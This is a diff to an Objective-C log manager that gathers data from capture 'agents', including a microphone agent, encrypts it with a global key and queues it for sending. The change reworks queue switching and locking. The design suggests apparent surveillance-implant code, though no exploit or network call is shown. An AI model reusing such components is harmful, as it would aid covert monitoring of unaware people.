@@ -284,7 +284,10 @@ typedef struct _log {
           
           if (self != nil)
             {
-              mActiveQueue = [[NSMutableArray alloc] init];
+              mQueue1 = [[NSMutableArray alloc] init];
+              mQueue2 = [[NSMutableArray alloc] init];
+              mActiveQueue = mQueue1;
+              
               mSendQueue = [[NSMutableArray alloc] init];
               mTempQueue = [[NSMutableArray alloc] init];
               
@@ -440,11 +443,7 @@ typedef struct _log {
           NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                                  forKeys: keys];
           [agentLog addEntriesFromDictionary: dictionary];
-          
-          [gActiveQueueLock lock];
-          [mActiveQueue addObject: agentLog];
-          [gActiveQueueLock unlock];
-          
+        
           [agent release];
           [_logID release];
           
@@ -475,8 +474,16 @@ typedef struct _log {
 #endif
           if ([self writeDataToLog: logHeader
                          forHandle: logFileHandle] == FALSE)
-            return FALSE;
-
+            {
+              [agentLog release];
+              [outerPool release];
+              return FALSE;
+            }
+            
+          [gActiveQueueLock lock];
+          [mActiveQueue addObject: agentLog];
+          [gActiveQueueLock unlock];
+        
           [agentLog release];
           [outerPool release];
           
@@ -493,214 +500,58 @@ typedef struct _log {
   return FALSE;
 }
 
-- (BOOL)closeActiveLogs: (BOOL)continueLogging
+- (NSMutableArray *)switchLogQueue
 {
+  NSMutableArray *oldQueue;
+  
   [gActiveQueueLock lock];
-  NSEnumerator *enumerator = [[[mActiveQueue copy] autorelease] objectEnumerator];
+  if (mActiveQueue == mQueue1)
+    {
+      mActiveQueue = mQueue2;
+      oldQueue = mQueue1;
+    }
+  else
+    {
+      mActiveQueue = mQueue1;
+      oldQueue = mQueue2;
+    }
   [gActiveQueueLock unlock];
   
-  NSMutableArray *tempArray = [[NSMutableArray alloc] init];
-  id anObject;
-  
-  while (anObject = [enumerator nextObject])
-    {
-      [[anObject objectForKey: @"handle"] closeFile];
-      
-      //
-      // Now put the log in the sendQueue and remove it from the active queue
-      //
-#ifdef DEBUG
-      NSLog(@"mSendQueue: %@", mSendQueue);
-      NSLog(@"mActiveQueue: %@", mActiveQueue);
-#endif
-      [gActiveQueueLock lock];
-      [gSendQueueLock lock];
-      
-      [mSendQueue addObject: anObject];
-      [mActiveQueue removeObject: anObject];
-      
-      [gSendQueueLock unlock];
-      [gActiveQueueLock unlock];
-      
-      //
-      // Verifying if we need to recreate the log entry so that the agents can
-      // keep logging (verify for possible races here)
-      //
-      if (continueLogging == TRUE)
-        {
-          NSNumber *tempAgentID = [NSNumber numberWithInt:
-                                   [[anObject objectForKey: @"agentID"] intValue]];
-
-          id tempAgentHeader = [anObject objectForKey: @"header"];
-
-          NSArray *keys = [NSArray arrayWithObjects: @"agentID",
-                                                     @"header",
-                                                     nil];
-          NSArray *objects = [NSArray arrayWithObjects: tempAgentID,
-                                                        tempAgentHeader,
-                                                        nil];
-          
-          NSMutableDictionary *agent = [[NSMutableDictionary alloc] init];
-          NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
-                                                                 forKeys: keys];
-          
-          [agent addEntriesFromDictionary: dictionary];
-          [tempArray addObject: agent];
-          [agent release];
-        }
-    }
-  
-  if (continueLogging == TRUE)
-    {
-#ifdef DEBUG
-      NSLog(@"Recreating agents log");
-#endif
-      for (id agent in tempArray)
-        {
-          id agentHeader = [agent objectForKey: @"header"];
-          
-          if ([agentHeader isKindOfClass: [NSString class]])
-            {
-              if ([agentHeader isEqualToString: @"NO"])
-                {
-#ifdef DEBUG
-                  NSLog(@"No Agent Header found");
-#endif
-                  
-                  [self createLog: [[agent objectForKey: @"agentID"] intValue]
-                      agentHeader: nil
-                        withLogID: [[agent objectForKey: @"logID"] intValue]];
-                }
-              else
-                {
-                  [self createLog: [[agent objectForKey: @"agentID"] intValue]
-                      agentHeader: [NSData dataWithData: [agent objectForKey: @"header"]]
-                        withLogID: [[agent objectForKey: @"logID"] intValue]];
-                }
-            }
-        }
-    }
-  
-#ifdef DEBUG
-  NSLog(@"Logs recreated correctly");
-#endif
-  
-  return TRUE;
+  return oldQueue;
 }
 
 - (BOOL)closeActiveLogsAndContinueLogging: (BOOL)continueLogging
 {
   NSMutableIndexSet *discardedItem  = [NSMutableIndexSet indexSet];
   NSMutableArray *newItems          = [[NSMutableArray alloc] init];
-  NSMutableArray *tempAgentsConf    = [[NSMutableArray alloc] init];
   NSUInteger index                  = 0;
+  NSFileHandle *handle = nil;
   
   id item;
   
-  for (item in mActiveQueue)
-    {
-      int32_t agentID = [[item objectForKey: @"agentID"] intValue];
-    
-      if (continueLogging == YES
-          && (agentID == AGENT_MICROPHONE))
+  NSMutableArray *queue = [self switchLogQueue];
+  
+  for (item in queue)
+    {      
+      handle = [item objectForKey: @"handle"];
+      if (handle != nil) 
         {
-          //
-          // Close all the logs except the Audio ones
-          //
-#ifdef DEBUG_LOG_MANAGER
-          warnLog(@"Skipping Audio Log");
-#endif
-          continue;
+          [handle closeFile];
         }
-      
-      [[item objectForKey: @"handle"] closeFile];
+
       [newItems addObject: item];
       [discardedItem addIndex: index];
       
-      //
-      // Verifying if we need to recreate the log entry so that the agents can
-      // keep logging (verify for possible races here)
-      //
-      if (continueLogging == TRUE)
-        {
-          NSNumber *tempAgentID = [NSNumber numberWithInt:
-                                   [[item objectForKey: @"agentID"] intValue]];
-          
-          id tempAgentHeader = [item objectForKey: @"header"];
-          
-          NSArray *keys = [NSArray arrayWithObjects: @"agentID",
-                           @"header",
-                           nil];
-          NSArray *objects = [NSArray arrayWithObjects: tempAgentID,
-                              tempAgentHeader,
-                              nil];
-          
-          NSMutableDictionary *agent = [[NSMutableDictionary alloc] init];
-          NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
-                                                                 forKeys: keys];
-          
-          [agent addEntriesFromDictionary: dictionary];
-          [tempAgentsConf addObject: agent];
-          [agent release];
-        }
-      
       index++;
     }
+    
+  [queue removeObjectsAtIndexes: discardedItem];
   
-  [gActiveQueueLock lock];
   [gSendQueueLock lock];
-  
-  [mActiveQueue removeObjectsAtIndexes: discardedItem];
   [mSendQueue addObjectsFromArray: newItems];
-  
   [gSendQueueLock unlock];
-  [gActiveQueueLock unlock];
-  
-  if (continueLogging == TRUE)
-    {
-#ifdef DEBUG_LOG_MANAGER
-      infoLog(@"Recreating agents log");
-#endif
-      for (id agent in tempAgentsConf)
-        {
-          id agentHeader = [agent objectForKey: @"header"];
-          
-          if ([agentHeader isKindOfClass: [NSString class]])
-            {
-              if ([agentHeader isEqualToString: @"NO"])
-                {
-#ifdef DEBUG_LOG_MANAGER
-                  infoLog(@"No Agent Header found");
-#endif
-                  [self createLog: [[agent objectForKey: @"agentID"] intValue]
-                      agentHeader: nil
-                        withLogID: [[agent objectForKey: @"logID"] intValue]];
-                }
-            }
-          else if ([agentHeader isKindOfClass: [NSData class]])
-            {
-#ifdef DEBUG_LOG_MANAGER
-              infoLog(@"agentHeader (%@)", [agentHeader class]);
-              infoLog(@"agentHeader = %@", agentHeader);
-#endif
-              
-              NSData *_agentHeader = [[NSData alloc] initWithData: [agent objectForKey: @"header"]];
-              
-              [self createLog: [[agent objectForKey: @"agentID"] intValue]
-                  agentHeader: _agentHeader
-                    withLogID: [[agent objectForKey: @"logID"] intValue]];
-            
-              [_agentHeader release];
-            }
-        }
-    }
-  
-#ifdef DEBUG_LOG_MANAGER
-  infoLog(@"Logs recreated correctly");
-#endif
   
   [newItems release];
-  [tempAgentsConf release];
   
   return TRUE;
 }
@@ -708,51 +559,34 @@ typedef struct _log {
 - (BOOL)closeActiveLog: (u_int)agentID
              withLogID: (u_int)logID
 {
-  [gActiveQueueLock lock];
-  NSEnumerator *enumerator = [[[mActiveQueue copy] autorelease] objectEnumerator];
-  [gActiveQueueLock unlock];
+  BOOL logClosed = FALSE;
   
   id anObject;
   
+  [gActiveQueueLock lock];
+  NSEnumerator *enumerator = [[[mActiveQueue copy] autorelease] objectEnumerator];
+
   while (anObject = [enumerator nextObject])
     {
       if ([[anObject objectForKey: @"agentID"] unsignedIntValue] == agentID &&
           ([[anObject objectForKey: @"logID"] unsignedIntValue] == logID || logID == 0))
         {
-#ifdef DEBUG
-          NSLog(@"%s: Closing Log for agentID 0x%x with logID 0x%x", __FUNCTION__, agentID, logID);
-#endif
-          [[anObject objectForKey: @"handle"] closeFile];
-          
-          //
-          // Now put the log in the sendQueue and remove it from the active queue
-          //
-#ifdef DEBUG
-          NSLog(@"%s: mSendQueue: %@", __FUNCTION__, mSendQueue);
-          NSLog(@"%s: mActiveQueue: %@", __FUNCTION__, mActiveQueue);
-#endif
-          
-          [gActiveQueueLock lock];
-          [gSendQueueLock lock];
-          
-          [mSendQueue addObject: anObject];
-          [mActiveQueue removeObject: anObject];
-          
-          [gSendQueueLock unlock];
-          [gActiveQueueLock unlock];
-          
-#ifdef DEBUG
-          NSLog(@"%s: mSendQueue: %@", __FUNCTION__, mSendQueue);
-          NSLog(@"%s: mActiveQueue: %@", __FUNCTION__, mActiveQueue);
-#endif
-
-          return TRUE;
+          NSFileHandle *handle = [anObject objectForKey: @"handle"];
+          if (handle != nil)
+            {
+              [handle closeFile];
+              [anObject removeObjectForKey: @"handle"];
+              logClosed = TRUE;
+            }
+          break;
         }
-      }
-  
+    }
+    
+  [gActiveQueueLock unlock];
+
   usleep(10000);
   
-  return FALSE;
+  return logClosed;
 }
 
 - (BOOL)writeDataToLog: (NSData *)aData forHandle: (NSFileHandle *)anHandle
@@ -777,81 +611,49 @@ typedef struct _log {
               forAgent: (u_int)agentID
              withLogID: (u_int)logID
 {
-  BOOL logFound = FALSE;
-
-#ifdef DEBUG
-  NSLog(@"%s: Saving data for agent: %04x and logID 0x%x", __FUNCTION__, agentID, logID);
-#endif
+  BOOL dataWrited = FALSE;
+  id anObject;
+  CCCryptorStatus result = 0;
+  NSFileHandle *logHandle = nil;
   
+  if (aData == nil)
+    return dataWrited;
+    
+  int _blockSize = [aData length];
+  
+  NSData *blockSize = [NSData dataWithBytes: (void *)&_blockSize
+                                     length: sizeof(int)];
+  NSData *temp = [NSData dataWithBytes: gLogAesKey
+                                length: CC_MD5_DIGEST_LENGTH];
+  
+  result = [aData encryptWithKey: temp];
+  
+  if (result != kCCSuccess)
+    return dataWrited;
+                                                                  
   [gActiveQueueLock lock];
   NSEnumerator *enumerator = [mActiveQueue objectEnumerator];
-  [gActiveQueueLock unlock];
-  
-  id anObject;
   
   while (anObject = [enumerator nextObject])
     {
       if ([[anObject objectForKey: @"agentID"] unsignedIntValue] == agentID
           && ([[anObject objectForKey:@"logID"] unsignedIntValue] == logID || logID == 0))
-        {
-          logFound = TRUE;
-          
-          NSFileHandle *logHandle = [anObject objectForKey: @"handle"];
-      
-#ifdef DEV_MODE
-          unsigned char tmp[CC_MD5_DIGEST_LENGTH];
-          CC_MD5(gLogAesKey, strlen(gLogAesKey), tmp);
-          
-          NSData *temp = [NSData dataWithBytes: tmp
-                                        length: CC_MD5_DIGEST_LENGTH];
-#else
-          NSData *temp = [NSData dataWithBytes: gLogAesKey
-                                      length: CC_MD5_DIGEST_LENGTH];
-#endif
-
-          int _blockSize = [aData length];
-          CCCryptorStatus result = 0;
-          result = [aData encryptWithKey: temp];
-          
-          if (result == kCCSuccess)
+        {          
+          logHandle = [anObject objectForKey: @"handle"];
+          if (logHandle != nil)
             {
-#ifdef DEBUG
-              NSLog(@"%s: logData Encrypted correctly", __FUNCTION__);
-#endif
-        
-              NSData *blockSize = [NSData dataWithBytes: (void *)&_blockSize
-                                                 length: sizeof(int)];
-              
               // Writing the size of the clear text block
               [logHandle writeData: blockSize];
               // then our log data
               [logHandle writeData: aData];
-              
-              break;
+              dataWrited = TRUE;
             }
-          else
-            {
-#ifdef DEBUG
-              NSLog(@"%s: An error occurred while encrypting log data", __FUNCTION__);
-#endif
-            }
+          break;
         }
     }
-  
-  //
-  // If logFound is false and we called this function, it means that the agent
-  // is running but no file was recreated, thus we need to do it here
-  //
-  if (logFound == FALSE)
-    {
-#ifdef DEBUG_TMP
-      NSLog(@"%s: Log not found",__FUNCTION__);
-#endif
-      
-      return FALSE;
-    }
-  
-  return TRUE;
+  [gActiveQueueLock unlock];
+    
+  return dataWrited;
 }
 
 - (BOOL)removeSendLog: (u_int)agentID
